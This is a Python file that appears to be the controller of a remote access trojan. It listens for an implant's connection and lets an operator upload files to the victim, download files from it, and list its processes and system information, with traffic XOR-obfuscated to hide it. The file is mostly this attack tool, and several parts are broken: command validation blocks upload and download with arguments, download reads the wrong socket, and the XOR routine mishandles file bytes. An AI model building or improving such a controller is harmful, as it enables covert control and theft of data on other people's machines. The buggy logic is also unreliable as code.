import socket, select, os

HOST = '127.0.0.1'
PORT = 25565

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #establishing sockets
sock.bind((HOST, PORT))
sock.listen(1)

options = """ 

Commands:

help
upload
download
processes
systeminfo
end

"""

OPTIONS = ["upload", "download", "systeminfo", "processes", "help", "end"] #available commands

def xor(msg):
    newMsg = "" # init empty string
    for char in msg:
        decrChar = ord(str(char)) ^ ord('+') # compute xor for ascii value of char and +
        newMsg += str(chr(decrChar)) # append to new newMessage
    return str.encode(newMsg) # return result in bytes

def receiveMsg(conn):
    recv = conn.recv(8).decode()  # recieve incoming message length (up to 8 hex digits)
    print(f"message length encoded: {recv}")  # print decoded recieved data
    msg = xor(recv)  # decode the message received
    # turn message length into hex (message may be padded with 'P') 
    msgLen = int(msg, 16)  # turn msgLen into hex int
    print(f"message length (base 10): {msgLen}")
    
    
    while msgLen > 0: # when message length is less than 0, stop recieving
        if msgLen < 1024:  # if message length is less than 1024, only recieve the rest of the message
            recv = conn.recv(msgLen).decode()
            msg = xor(recv)
        else:  # otherwise recieve 1024 bytes at a time
            recv = conn.recv(1024).decode()  # receive 1024 bytes
            msg = xor(recv)  # xor decode 1024 bytes
            
        print(f"message decoded:\n\n{msg.decode()}")
        msgLen = msgLen - 1024  # decrement message length
        
def main():
    while True: 
        print("Accepting...")
        conn, addr = sock.accept() # Accept incoming connection and get client's address
        print ('Connection from ' + str(addr))

        while True: #beggining of accepting input
            print(options)
            userInput = input(">> ")
            if userInput not in OPTIONS: #validate user input
                print(f"\n'{userInput}' is not a valid option.\n")
            elif userInput == "end": # if input is end close connection
                conn.sendall(xor("end")) # send encrypted end to client
                conn.shutdown(socket.SHUT_RDWR) #shutdown socket for reading and writing
                conn.close()
                break            
            elif userInput.lower() == "upload":
                # syntax: upload /path/to/file
                # file will go to client's  current working directory
                print("Sending upload command") # debug
                command = userInput.split(' ')

                if len(command) != 2: #check if number args provided is correct
                    print("Incorrect upload syntax, use two arguments.")
                    continue

                userInput = xor(command[0].lower()) #encrpyt user input commmand
                conn.sendall(userInput) #send encrypted command to client

                sourcePath = command.pop(1) #get src file path from user input
                
                #fileSize = os.stat(sourcePath).st_size #get file size
                #fileSizeStr = str(fileSize).zfill(10) #file size -> string and pad with zeros
                #print(fileSizeStr)
                #print(f"Filesize of file to upload is: {fileSizeStr}")
                #userInput = xor("{fileSizeStr}") #encrypt filesize with pad
                #conn.sendall(userInput) #send encrypted file to client

                with open(sourcePath, 'rb') as file: #open src file in binary mode
                    conn.sendall(xor(file.read()))
                    
                conn.recv(1024) # get confirmation if file was recieved
            
            elif userInput.lower() == "download" :
                # syntax: download /remote/path    client/file/path    local/file/path
                # file will go to server's current working directory
                
                command = userInput.split(' ')

                if len(command) != 3: #check if number args provided is correct
                    print("Incorrect download syntax, use two arguments.")
                    continue
                
                userInput = xor(command[0].lower()) #encrpyt user input commmand
                conn.sendall(userInput) #send encrypted command to client
                
                userInput = xor(command[1].lower())
                conn.sendall(userInput) # send name of file desired for download
                
                destPath = command.pop(1)
                print(f"Writing file to {destPath}\n") 
                with open(destPath, 'wb') as file:
                    while True:
                        filedata = sock.recv(1024)
                        if not filedata:
                            break
                        file.write(filedata)
                    print(f"File {destPath} received successfully")
                '''
                f = open(destinationPath, 'w+b') #open destinaiton file in write and binary mode
                
                userInput = ' '.join(command) #join remaining command parts of the user inputs
                userInput = xor(userInput) #encrypt user input
                conn.sendall(userInput) #send encrypted command to client
            
                fileuserInput = conn.recv(1024) # Receive file data from client
                while(fileuserInput):

                    fileuserInput = xor(fileuserInput) #decrypt file data from client
                    print(fileuserInput)
                    # This will probably break at some point, not ideal solution
                    if "99999EOF99999" in fileuserInput: # check if end of file marker is present in the file data
                        temp = fileuserInput.split("99999EOF99999") # split the file data by the end of file marker
                        if "xxxxx" in temp[0]: # check if file size marker is present in the first part of the file data
                            temp = temp[0].split("xxxxx") # split the first part by the file size marker
                            fileSize = temp[1] # get the file size
                            print("Writing {} bytes.\n".format(fileSize))
                            f.write(temp[2]) # write the file data to the destination file
                        else:
                            f.write(temp[0]) # write the file data to the destination file
                        break
                    elif "xxxxx" in fileuserInput: #same is first if statement above
                        temp = fileuserInput.split("xxxxx")
                        fileSize = temp[1]
                        print("Writing {} bytes.\n".format(fileSize))
                        f.write(temp[2])
                        fileuserInput = conn.recv(1024) # receive more file data from the client
                    else:
                        f.write(fileuserInput)
                        fileuserInput = conn.recv(1024)    

                print("File download complete!\n")
                f.close() # close destination file
                '''
                break
            elif userInput.lower() == "systeminfo" or userInput.lower() == "processes":
                userInput = xor(userInput)  # xor user input
                conn.sendall(userInput)  # send xor'd user input
                receiveMsg(conn)
                    
            elif "help" in userInput.lower():
                print(options)
            
if __name__ == "__main__":
    main()